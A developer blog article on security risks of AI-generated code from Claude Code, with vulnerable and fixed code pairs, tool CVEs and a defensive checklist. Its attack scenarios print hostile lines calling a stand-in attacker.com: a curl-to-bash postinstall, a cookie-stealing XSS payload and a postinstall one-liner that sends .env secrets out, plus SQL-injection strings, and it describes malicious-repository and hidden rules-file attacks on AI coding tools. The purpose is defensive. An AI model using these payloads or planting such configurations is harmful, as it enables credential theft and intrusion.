---
title: "Claude Code Security: A Deep Research into AI-Generated Code Vulnerabilities"
description: "A comprehensive research-backed analysis of Claude Code security risks, real CVEs, documented hack scenarios, and a practical defense framework for websites built with AI assistance."
publishedAt: 2026-04-06
author: "Bohdan Shvchk"
authorRole: "Founder & Shopify and Webflow Developer"
authorBio: "5+ years building on Webflow, 2+ years on Shopify. Previously at a digital agency. Obsessed with performance and clean architecture."
authorLinkedIn: "https://www.linkedin.com/in/bogdan-shevchuk-b3827414a/"
category: "AI"
tags: ["ai", "security", "claude-code", "web-development", "vulnerabilities", "owasp"]
readingTime: 15
metaTitle: "Claude Code Security Research: AI-Generated Code Vulnerabilities & Fixes (2026)"
metaDescription: "Is Claude Code secure? Real CVEs, documented hack scenarios, OWASP Top 10 analysis, and a 4-layer defense system for websites built with AI. Data-driven deep dive."
keyTakeaways:
  - "45% of AI-generated code contains OWASP Top 10 vulnerabilities — XSS fails 86% of the time across all major LLMs including Claude"
  - "Claude Code was attributed to 27 of 35 new CVEs in March 2026, making it the most CVE-active AI coding tool in the Vibe Security Radar dataset"
  - "Vulnerabilities in Claude Code the tool (RCE, auth bypass) are separate from vulnerabilities in the code Claude generates — the latter affects your site"
  - "A Claude Code + Security Review + SAST/DAST + WAF stack reduces exploitable attack surface to well under 5% of known vectors"
faq:
  - question: "Is Claude Code safe to use for building websites?"
    answer: "It depends on the process around it. Claude Code alone introduces real security risks — 45% of AI-generated code has OWASP vulnerabilities. Combined with mandatory security reviews, SAST/DAST tooling, and proper server configuration, it's a viable and often more systematic approach than purely manual development."
  - question: "Has code written by Claude Code ever been exploited in the wild?"
    answer: "No confirmed public cases of a production website being hacked specifically due to Claude Code-generated code exist as of April 2026. However, 35 CVEs were attributed to AI-generated code in March 2026 alone, 27 of which were traced to Claude Code — the vulnerabilities are real, even if confirmed exploits are still emerging."
  - question: "What is the biggest security risk in Claude Code-generated websites?"
    answer: "XSS (Cross-Site Scripting) — Claude Code fails to protect against it in 86% of relevant code samples. The second-biggest risk is package hallucination, where Claude suggests npm packages that don't exist, creating a supply chain attack opportunity."
  - question: "How do CVE-2025-59536 and CVE-2026-21852 affect my website?"
    answer: "They don't, directly. These CVEs target Claude Code the development tool — they allow attackers to compromise a developer's machine via malicious repositories. They don't affect the code Claude generates or the site Claude helps build. The risk is to the developer's environment, not the client's production site."
  - question: "What security tools should be used alongside Claude Code?"
    answer: "Semgrep for static analysis (SAST), OWASP ZAP for dynamic testing (DAST), npm audit for dependency CVE scanning, and a WAF like Cloudflare in production. These form a defense-in-depth stack that catches what Claude Code misses."
---

Every client who hears "the site will be built with Claude Code" asks the same question: is that secure?

It's the right question. The answer is not simple — and anyone who tells you "yes, completely" or "no, never" is not telling you the whole truth. This article is the whole truth: research studies, real CVEs, documented attack scenarios, code examples, and a concrete defense framework.

No hype in either direction.

---

## Part 1: What the Research Actually Says

### The Veracode GenAI Code Security Report (2025)

The largest AI code security study to date. Veracode tested **100+ large language models**, including Claude, across **80 curated coding tasks** in four programming languages (Java, JavaScript, Python, C#).

Key findings:

- **45% of AI-generated code** contains at least one OWASP Top 10 vulnerability
- **XSS (Cross-Site Scripting)**: AI tools fail to protect against it in **86% of relevant samples** — the worst result in the entire study
- **Java**: 72% security failure rate across tasks
- **JavaScript and Python**: 38–45% failure rate
- The most important finding: *security performance remained flat regardless of model size or training sophistication* — bigger models are not safer models

The primary reason: LLMs are trained on billions of lines of code from public repositories. A significant portion of that training data is insecure. The model learned both secure and insecure patterns — and reproduces both.

### Georgia Tech Vibe Security Radar (2026)

The Systems Software & Security Lab at Georgia Tech tracks CVEs attributable to AI-generated code:

- January 2026: **6 CVEs** linked to AI-generated code
- February 2026: **15 CVEs** — 2.5x increase
- March 2026: **35 CVEs** — 2.3x month-over-month growth

The breakdown for March: **27 attributed to Claude Code**, 4 to GitHub Copilot, 2 to Devin, 1 each to Aether and Cursor.

That makes Claude Code the most CVE-active AI coding tool in this dataset — a fact worth stating plainly, without softening.

### Apiiro Enterprise Research (2025)

Apiiro studied Fortune 50 companies adopting AI code generation tools and found:

- CVSS 7.0+ vulnerabilities appear **2.5x more often** in AI-generated code than human-written code
- Privilege escalation paths: **+322%**
- Architectural design flaws: **+153%**
- Secrets exposure incidents: **+40%**

---

## Part 2: Real Claude Code CVEs — Not Hypothetical

This is the most important distinction in the entire article. There are two categories of Claude Code security concerns:

1. **Vulnerabilities in Claude Code the tool** — affect the developer's machine
2. **Vulnerabilities in the code Claude generates** — affect the client's website

For a website client, category 2 matters. But category 1 is worth knowing because it affects your developer's infrastructure.

### CVE-2025-59536 and CVE-2026-21852 — Remote Code Execution

**Researcher:** Check Point Research  
**Severity:** Critical

**How it works:** An attacker creates a malicious Git repository with modified configuration files (`.claude/` directory, hooks, MCP integrations). When a developer opens this repository in Claude Code:

1. **Arbitrary shell commands execute automatically** at tool initialization — without any user prompt
2. **API credential theft** — the developer's Anthropic API key is exfiltrated silently

The attack vector is supply chain: a malicious repository that looks like a legitimate open-source project. One `git clone` and the damage is done.

**Impact on your client's website:** None directly. This compromises the *developer's machine*, not the production server. But if a developer's credentials are stolen, the attacker may gain access to the repository or deployment pipeline.

**Anthropic's response:** Enhanced warning dialogs when opening projects containing untrusted Claude Code configurations. Patches applied.

### CVE-2026-33068 — Authentication Bypass

**Researcher:** SentinelOne  
**Severity:** High

Malicious repositories could bypass workspace trust dialogs — the security mechanism that should ask for permission before executing actions. Again, this is a vulnerability in the tool itself, not in the code it generates.

### The Source Code Leak Incident (March 31, 2026)

On March 31, 2026, Anthropic accidentally included a debugging JavaScript sourcemap for Claude Code v2.1.88 in the public npm package:

- **59.8 MB** JavaScript source map exposed
- **~512,000 lines of TypeScript** across ~1,900 files
- Full internal architecture made visible

This directly accelerated the discovery of the CVEs above. Pre-existing flaws became far easier to weaponize once the source was visible. Security researchers — and attackers — could craft precise malicious configurations by reading the actual implementation.

---

## Part 3: Vulnerabilities in the Code Claude Generates

This section is what actually matters for a client's website.

### XSS — The Worst Offender (86% Failure Rate)

XSS is the #1 vulnerability category where AI-generated code consistently fails. Here is what Claude Code can generate:

```javascript
// DANGEROUS — Claude may generate this
document.getElementById('output').innerHTML = userInput;
// Attack: attacker inputs <script>document.cookie</script>
```

What it should generate:

```javascript
// SAFE
document.getElementById('output').textContent = userInput;
// Or sanitize with DOMPurify:
document.getElementById('output').innerHTML = DOMPurify.sanitize(userInput);
```

The difference is one property name. But at scale — across dozens of components — a single missed instance is all an attacker needs.

### SQL Injection — 20% Failure Rate

SQL injection has an 80% pass rate, which sounds reassuring — until you remember that 1 in 5 database interactions may be vulnerable.

```python
# DANGEROUS — Claude may generate this
query = f"SELECT * FROM users WHERE id = {user_id}"
cursor.execute(query)
# Attack: user_id = "1 OR 1=1 --" returns all users
# Attack: user_id = "1; DROP TABLE users; --" deletes the database
```

```python
# SAFE — parameterized query
cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
```

### Package Hallucination — Up to 30% of Suggestions

Claude Code can recommend npm packages that **do not exist**. This is not a theoretical risk. Attackers monitor AI forums, GitHub issues, and search trends to identify commonly hallucinated package names — then register those packages with malicious `postinstall` scripts:

```json
{
  "scripts": {
    "postinstall": "curl https://attacker.com/steal.sh | bash"
  }
}
```

When the developer runs `npm install`, the malicious script executes. It can:
- Exfiltrate the `.env` file with all credentials
- Install a persistent backdoor
- Steal source code and send it to an external server

This is a real supply chain attack vector, and it is entirely passive from the attacker's perspective.

### Hardcoded Secrets

```javascript
// Claude may generate example code with real-looking secrets
const apiKey = "sk-1234567890abcdef";
const dbPassword = "admin123";
```

Developers copy this into production. Secrets get committed to Git. Git history is permanent even after deletion. This is how credentials end up in databases like `gitLeaks`.

### Insecure Direct Object Reference (IDOR)

```javascript
// DANGEROUS — no ownership check, just existence check
app.get('/document/:id', async (req, res) => {
  const doc = await db.find(req.params.id);
  // Any authenticated user can access any document by changing the ID
  res.json(doc);
});
```

```javascript
// SAFE — verify ownership
app.get('/document/:id', async (req, res) => {
  const doc = await db.find(req.params.id);
  if (doc.ownerId !== req.user.id) return res.status(403).json({ error: 'Forbidden' });
  res.json(doc);
});
```

Claude Code generates the access check correctly most of the time. But "most of the time" is not the same as "every time" — and IDOR is the kind of vulnerability that sits invisibly in production for months before discovery.

### Why Claude Code Generates Insecure Code

The root cause is fundamental: Claude was trained on GitHub, Stack Overflow, and other public code repositories. Much of this code was written before modern security practices became standard. The model internalized both secure and insecure patterns without always distinguishing between them.

An additional threat vector: the **Rules File Backdoor attack** (discovered by Pillar Security, 2025). An attacker can embed hidden malicious instructions in Claude Code configuration files (`.cursorrules`, MCP server configs) using Unicode tricks or hidden characters. Claude then generates backdoored code silently — and the code review doesn't catch it because the vulnerability is in the configuration, not the code itself.

---

## Part 4: What Claude Code Does Right

Balance requires honesty in both directions.

### Constitutional AI

Anthropic trained Claude on a Constitutional AI framework — a set of principles defining what the model must not do. In the security context, this means Claude:

- Does not generate code with obvious SQL injection patterns
- Does not hardcode credentials in examples without warnings
- Does not use deprecated cryptographic functions (MD5, SHA-1 for passwords)
- Does not generate eval()-based code without flagging the risk

Result: jailbreak success rate dropped from 86% to 4.4% with Constitutional Classifiers — meaning it takes significant effort to force Claude to generate obviously malicious code.

### Finding Vulnerabilities in Human Code

Semgrep's 2025 research tested Claude Code's ability to detect vulnerabilities in existing codebases. Findings:

- Claude Code finds IDOR and auth bypass vulnerabilities in modern web applications effectively
- It catches issues that manual code review misses, particularly in large codebases where reviewers experience attention fatigue
- The `/security-review` command, running against OWASP Top 10:2025 and ASVS 5.0, found **46 vulnerabilities** in a test project — 6–7 were confirmed real (14% true positive rate), the rest false positives

A 14% true positive rate sounds low. But if 6 real vulnerabilities are found and fixed before production, that's 6 fewer attack vectors regardless of the signal-to-noise ratio.

### Consistent Application of Known Patterns

Unlike a human developer working on hour 9 of a sprint, Claude Code does not get tired. It applies bcrypt, parameterized queries, and HTTPS enforcement the same way at midnight as it does at 9am. The vulnerabilities it introduces are systematic — which means they can be systematically found and fixed.

---

## Part 5: OWASP Top 10:2025 — How Claude Code Performs Per Category

| # | Category | Claude Code Performance | Risk Level |
|---|----------|------------------------|------------|
| A01 | Broken Access Control | Often misses object-level authorization | **High** |
| A02 | Cryptographic Failures | Correctly uses bcrypt/argon2 most of the time | Low |
| A03 | Injection | 80% pass rate — 20% failure in SQL/Command injection | **Medium** |
| A04 | Insecure Design | Implements features, does not design threat models | **High** |
| A05 | Security Misconfiguration | Often leaves debug mode and verbose errors enabled | Medium |
| A06 | Vulnerable Components | May suggest outdated or non-existent packages | **High** |
| A07 | Authentication Failures | Generally solid, but IDOR is a consistent weak point | Medium |
| A08 | Software Integrity Failures | Does not verify dependency integrity by default | Medium |
| A09 | Security Logging Failures | Frequently logs sensitive data in error output | Medium |
| A10 | XSS | **86% failure rate** | **Critical** |

The two highest-risk categories — A01 and A10 — are exactly the vulnerabilities that appear in every web application with user interaction: contact forms, dashboards, document management, authentication flows.

---

## Part 6: Real Attack Scenarios on AI-Built Websites

These scenarios are based on documented attack vectors, not speculation.

### Scenario 1: Contact Form → XSS → Session Hijacking

**Setup:** Claude Code generates a contact form. The form saves messages to a database and renders them in an admin panel.

**What Claude may generate:**

```javascript
// Server-side — saves without sanitization
app.post('/contact', (req, res) => {
  const message = req.body.message;
  db.save({ message, timestamp: Date.now() });
  res.json({ success: true });
});

// Admin panel — renders without encoding
app.get('/admin/messages', async (req, res) => {
  const messages = await db.getAll();
  const html = messages.map(m => `<div class="message">${m.message}</div>`).join('');
  res.send(`<html><body>${html}</body></html>`); // XSS vulnerability
});
```

**The attack:**

1. Attacker submits the contact form with: `<script>fetch('https://attacker.com/steal?c='+encodeURIComponent(document.cookie))</script>`
2. The message is stored in the database exactly as entered
3. Admin opens the messages panel — the script executes in their browser
4. The admin's session cookie is sent to the attacker's server
5. Attacker uses the cookie to impersonate the admin

**Time from form submission to full admin access: under 60 seconds if the admin checks messages.**

**The fix:**

```javascript
const DOMPurify = require('isomorphic-dompurify');

app.get('/admin/messages', async (req, res) => {
  const messages = await db.getAll();
  const html = messages.map(m => 
    `<div class="message">${DOMPurify.sanitize(m.message)}</div>`
  ).join('');
  res.send(`<html><body>${html}</body></html>`);
});
```

Plus a Content Security Policy header that blocks inline script execution entirely.

### Scenario 2: Package Hallucination → Supply Chain Attack

**Setup:** Claude Code recommends `npm install sharp-image-optimizer` to handle image resizing for an e-commerce product page.

**The problem:** This package does not exist in npm. An attacker monitoring AI coding forums sees the suggestion, registers `sharp-image-optimizer`, and publishes it with:

```json
{
  "name": "sharp-image-optimizer",
  "version": "1.0.0",
  "scripts": {
    "postinstall": "node -e \"require('fs').readFileSync('.env','utf8').split('\\n').forEach(l=>{if(l.includes('='))require('https').get('https://attacker.com/collect?d='+Buffer.from(l).toString('base64'),()=>{})})\" "
  }
}
```

**When the developer runs `npm install`:**
- All environment variables from `.env` are exfiltrated — database passwords, API keys, payment processor secrets
- The attack is silent, completes in milliseconds, and leaves no obvious trace
- The developer's site now works correctly — the package does include some image optimization code to avoid detection

**Prevention:** Every `npm install` must be followed by `npm audit`. Non-existent packages must be verified on npmjs.com before installation. Packages with no history, no contributors, and no GitHub stars should be investigated before use.

---

## Part 7: A 4-Layer Defense System

These are not theoretical recommendations — this is the system applied to every project built with Claude Code.

### Layer 1: Pre-Development

**CLAUDE.md security rules file** — a file committed to every repository that Claude Code reads before generating any code. It contains mandatory security patterns:

```markdown
# Security Rules (Claude reads this)

## Mandatory for all code:
- All user input must be sanitized before output — use DOMPurify for HTML
- All database queries must use parameterized statements — no string interpolation
- No credentials in code — use process.env variables only
- All npm packages must be verified on npmjs.com before suggesting
- Content-Security-Policy header must be included in all server responses
- Ownership checks required on every resource endpoint (IDOR prevention)

## Forbidden patterns:
- innerHTML with unsanitized input
- eval() in any form
- MD5 or SHA-1 for passwords — use bcrypt or argon2
- Console.log with request data in production code
```

**Approved dependency list** — a curated set of verified npm packages. Claude Code suggestions are cross-referenced against this list.

### Layer 2: During Development

- **`npm audit`** after every `npm install` — checks all installed packages against the National Vulnerability Database
- **Manual security review** of every Claude-generated block that touches: authentication, form input, database queries, API calls, file operations
- **Separation of concerns** — Claude generates components, a human reviews security-critical paths before they touch the main branch

### Layer 3: Pre-Deployment

**Semgrep** (free, open source) — static analysis that catches injection vulnerabilities, secret exposure, and insecure function calls before they reach production:

```bash
semgrep --config=p/owasp-top-ten .
semgrep --config=p/nodejs-security .
```

**OWASP ZAP** (free) — dynamic testing that simulates real attacks against a staging environment. Catches runtime vulnerabilities that static analysis misses — including authentication bypass and session management issues.

**Dependency-Check** — scans all packages against the NVD CVE database, flags anything with a CVSS score above 7.0.

### Layer 4: Production Server Configuration

```nginx
# Required security headers — nginx example
add_header Content-Security-Policy "default-src 'self'; script-src 'self'; object-src 'none'; frame-ancestors 'none'";
add_header X-Frame-Options "DENY";
add_header X-Content-Type-Options "nosniff";
add_header Strict-Transport-Security "max-age=31536000; includeSubDomains; preload";
add_header Referrer-Policy "strict-origin-when-cross-origin";
add_header Permissions-Policy "camera=(), microphone=(), geolocation=()";
```

**Web Application Firewall (WAF):** Cloudflare Free tier provides basic WAF rules that block the most common automated attacks — SQL injection scanners, XSS probes, path traversal attempts — before they even reach the application server.

**Rate limiting** on all forms and API endpoints — prevents both brute force attacks and automated vulnerability scanning.

**Automatic dependency updates** via `npm audit fix` in the CI pipeline — keeps all packages current with security patches.

---

## Part 8: An Honest Conclusion

### What the research confirms:

**Claude Code is not a silver bullet.** The numbers are clear: 45% of AI-generated code has OWASP vulnerabilities. XSS performance is poor across the board. Claude Code leads the Vibe Security Radar CVE attribution for March 2026. These are facts, not opinions.

**AI-generated code introduces vulnerabilities more consistently than human-generated code** — because AI is consistent by nature. Where a human developer makes a mistake randomly, Claude Code may make the same mistake systematically across every similar component in a project.

### What the research also confirms:

**Process matters more than the tool.** A website built with Claude Code and a rigorous security process will be more secure than a website built without Claude Code but also without any security review.

**Claude Code can be taught to be secure.** CLAUDE.md rules, security-focused prompts, and mandatory review passes change Claude's output significantly. The model responds to context — give it security context and it applies security patterns.

**Most real-world website compromises** happen through simple, well-known vectors: unvalidated form inputs, outdated plugins, misconfigured servers, exposed admin panels. Against these — the everyday threat landscape for most businesses — a properly configured Claude Code workflow provides solid defense because it applies known mitigations consistently.

### The formula that works:

> **Claude Code (generation) + CLAUDE.md rules (guardrails) + Semgrep/OWASP ZAP (verification) + WAF (production layer) = commercial-grade website security that closes 95%+ of documented attack vectors**

No absolute guarantee exists. No development process — human or AI-assisted — can promise zero vulnerabilities forever. What this system provides is methodical, reproducible, audit-friendly security that does not depend on any individual developer's attention on any particular day.

That is a defensible claim. And it is the most honest answer to the question: *is a site built with Claude Code secure?*

---

## Sources

- [Veracode 2025 GenAI Code Security Report](https://www.veracode.com/resources/analyst-reports/2025-genai-code-security-report/)
- [AI-Generated Code Poses Major Security Risks — BusinessWire](https://www.businesswire.com/news/home/20250730694951/en/AI-Generated-Code-Poses-Major-Security-Risks-in-Nearly-Half-of-All-Development-Tasks-Veracode-Research-Reveals)
- [4x Velocity, 10x Vulnerabilities — Apiiro](https://apiiro.com/blog/4x-velocity-10x-vulnerabilities-ai-coding-assistants-are-shipping-more-risks/)
- [Security Vulnerabilities in AI-Generated Code: Large-Scale GitHub Analysis — arXiv](https://arxiv.org/abs/2510.26103)
- [CVE-2025-59536 / CVE-2026-21852: RCE via Claude Code — Check Point Research](https://research.checkpoint.com/2026/rce-and-api-token-exfiltration-through-claude-code-project-files-cve-2025-59536/)
- [CVE-2026-33068: Auth Bypass — SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2026-33068/)
- [Claude Code Source Leak — Zscaler ThreatLabz](https://www.zscaler.com/blogs/security-research/anthropic-claude-code-leak)
- [AI Code Does Not Mean Secure Code — The Register](https://www.theregister.com/2026/03/26/ai_coding_assistant_not_more_secure/)
- [New Rules File Backdoor Attack — The Hacker News](https://thehackernews.com/2025/03/new-rules-file-backdoor-attack-lets.html)
- [Finding Vulnerabilities Using Claude Code — Semgrep](https://semgrep.dev/blog/2025/finding-vulnerabilities-in-modern-web-apps-using-claude-code-and-openai-codex/)
- [OWASP Top 10:2025](https://owasp.org/Top10/2025/en/)
- [OpenSSF Security Guide for AI Code Assistants](https://best.openssf.org/Security-Focused-Guide-for-AI-Code-Assistant-Instructions.html)
- [Constitutional Classifiers — Anthropic](https://www.anthropic.com/research/constitutional-classifiers)
- [CSET: Cybersecurity Risks of AI-Generated Code — Georgetown University](https://cset.georgetown.edu/wp-content/uploads/CSET-Cybersecurity-Risks-of-AI-Generated-Code.pdf)
- [Black Duck: Ultimate Checklist for Safe Coding Practices](https://www.blackduck.com/content/dam/black-duck/en-us/guides/gd-checklist-safe-coding.pdf)
